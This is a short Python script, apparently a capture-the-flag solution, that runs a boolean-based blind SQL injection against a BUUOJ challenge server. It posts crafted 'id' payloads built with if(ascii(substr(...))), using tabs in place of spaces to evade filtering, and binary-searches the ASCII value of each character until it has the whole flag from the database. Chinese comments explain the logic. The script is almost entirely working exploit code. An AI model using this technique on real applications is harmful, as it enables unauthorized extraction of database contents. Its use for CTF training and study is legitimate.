import requests
url = 'http://31b49561-3846-4845-99fd-f2e62968df45.node5.buuoj.cn:81'
data = {"id":""}
flag = 'flag{'

i = 6
while True:
#从可打印字符开始，利用二分法寻找合适的ASCII对应的字符
    begin = 32
    end = 126
    tmp = (begin+end)//2
    while begin<end:
        data["id"] = "if(ascii(substr((select		flag		from	flag),{},1))>{},1,2)".format(i,tmp) #利用1、2返回的语句来判断过大还是过小
        r = requests.post(url,data=data)
        if 'Hello' in r.text: #如果是1的话，就会返回Hello，向右查找
            begin = tmp+1
            tmp = (begin+end)//2 
        else: #否则向左查找
            end = tmp
            tmp = (begin+end)//2
    flag+=chr(tmp)
    print(flag)
    i+=1
    if flag[-1]=='}': #根据flag的格式，}是结束标志
        break